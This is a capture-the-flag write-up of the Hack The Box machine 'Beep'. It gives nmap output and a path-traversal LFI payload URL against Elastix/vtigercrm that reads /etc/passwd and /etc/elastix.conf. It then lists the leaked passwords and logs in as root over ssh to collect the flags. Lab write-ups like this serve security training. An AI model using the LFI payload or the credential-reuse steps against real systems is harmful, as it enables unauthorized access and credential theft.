# Beep
>Author : Xyan1d3
>Date : 29th June 2021
>IP : 10.10.10.7
>OS : Linux
>Difficulty : Easy

# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Tue Jun 29 23:21:56 2021 as: nmap -sC -sV -v -oN nmap/beep 10.10.10.7
Nmap scan report for beep.htb (10.10.10.7)
Host is up (0.078s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://beep.htb/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: TOP PIPELINING STLS IMPLEMENTATION(Cyrus POP3 server v2) UIDL RESP-CODES APOP LOGIN-DELAY(0) USER AUTH-RESP-CODE EXPIRE(NEVER)
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: ATOMIC Completed RENAME OK URLAUTHA0001 X-NETSCAPE SORT=MODSEQ NAMESPACE LISTEXT SORT CONDSTORE IDLE IMAP4 CATENATE ANNOTATEMORE STARTTLS ACL NO CHILDREN THREAD=ORDEREDSUBJECT LIST-SUBSCRIBED UIDPLUS QUOTA MULTIAPPEND MAILBOX-REFERRALS THREAD=REFERENCES RIGHTS=kxte IMAP4rev1 UNSELECT BINARY ID LITERAL+
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2017-04-07T08:22:08
| Not valid after:  2018-04-07T08:22:08
| MD5:   621a 82b6 cf7e 1afa 5284 1c91 60c8 fbc8
|_SHA-1: 800a c6e7 065e 1198 0187 c452 0d9b 18ef e557 a09f
|_ssl-date: 2021-06-29T17:55:23+00:00; +3s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: 2s
```

## Web Enumeration
We visit the site and find that `http://10.10.10.7` redirects to `https://10.10.10.7`.
SSL Certificate does not leak any sensitive information.

We visit the site and find out that this is running `elastix` and gives us a login page.
![[Pasted image 20210629235208.png]]

We could go and search for any possible exploits for this `elastix` thingy.
![[Pasted image 20210629235625.png]]
We have one with an LFI vulnerability which could allow us to get some files from the box.

We run the exploit but, The exploit does not work as it should.
But, We could try this exploit manually by copying the link and using it on the browser manually.
![[Pasted image 20210629235908.png]]

We visit the site and find out that we can print out the `/etc/passwd`.
URL : `view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action`
![[Pasted image 20210630000036.png]]

We coul try to find out the credentials of the `elastix` which we find out by doing a little bit of googling.
![[Pasted image 20210630003939.png]]
The location of the credentials are in `/etc/elastix.conf`.

We try to leak the file using the LFI , We found earlier.
![[Pasted image 20210630004258.png]]

We get some credentials from that files.

|Note|Password|
|--|--|
|mysqlrootpwd|jEhdIekWmdjE|
|cyrususerpwd|jEhdIekWmdjE|
|amiadminpwd|jEhdIekWmdjE|

# Initial FootHold as root
We could use the credentials we extracted from the `/etc/elastix.conf` to ssh into the box as the user `root`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.11]─[~/htb/beep]
└──╼ # ssh root@10.10.10.7
Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

We see that we cannot ssh as it has some issues with the initial cipher exchange.
![[Pasted image 20210630010143.png]]
Source : https://unix.stackexchange.com/questions/340844/how-to-enable-diffie-hellman-group1-sha1-key-exchange-on-debian-8-0/340853

```python
┌─[Magisk@Xyan1d3]─[10.10.14.11]─[~/htb/beep]
└──╼ # ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7
root@10.10.10.7's password: 
Last login: Tue Jun 29 22:33:08 2021 from 10.10.14.11

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# whoami
root
[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

## Getting the User Flag
We can get our `user.txt` from the `/home/fanis/user.txt`.
```python
[root@beep ~]# cd /home/fanis/
[root@beep fanis]# ls -l
total 4
-rw-rw-r-- 1 fanis fanis 33 Jun 29 20:12 user.txt
[root@beep fanis]# cat user.txt 
c625230d5ff9d2425fbc8c070ea36056
```

## Getting the Root Flag
We can get our `root.txt` from the `/root/root.txt`.
```python
[root@beep fanis]# cd /root/
[root@beep ~]# ls -l
total 16248
-rw------- 1 root root     6025 Apr  7  2017 anaconda-ks.cfg
-r-xr-xr-x 1 root root   190461 Aug 10  2011 elastix-pr-2.2-1.i386.rpm
-rw-r--r-- 1 root root    18433 Apr  7  2017 install.log
-rw-r--r-- 1 root root        0 Apr  7  2017 install.log.syslog
-rw-r--r-- 1 root root        1 Apr  7  2017 postnochroot
-rw------- 1 root root       33 Jun 29 20:12 root.txt
-r-xr-xr-x 1 root root 16358730 Oct 31  2011 webmin-1.570-1.noarch.rpm
[root@beep ~]# cat root.txt 
2626f36c75ad47ed7f1b84ee91062ca1
```